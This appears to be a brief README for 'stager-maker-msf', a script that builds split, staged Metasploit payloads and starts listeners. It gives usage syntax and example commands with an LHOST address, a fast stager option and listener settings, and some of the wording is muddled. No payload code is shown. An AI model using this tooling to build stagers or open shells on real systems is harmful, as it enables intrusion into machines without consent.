# stager-maker-msf
Staging of payload splitting from 25-22 pcs.

///// options //////

use -> ./script <LHOST> or <PAYLOAD> and optional {<STAGER> spec|fast} and/or {<START_MSF> yes and/or <SET_LHOST_MSF>}

example -> ./scpt 192.168.1.241 yes (start metasploit, set custom later) optional is "yes" if IP is specified!
example -> ./scpt 192.168.1.241 0.0.0.0 (start metasploit, set all listeners)
example -> ./scpt 192.168.1.241 fast yes 0.0.0.0 (create payload with fast method and start metasploit, set all listeners)
example -> ./scpt payload_shell fast yes 0.0.0.0 (same as above, pre-made payload instead of IP)
(default stager method: special, work time: 2.5-5s)

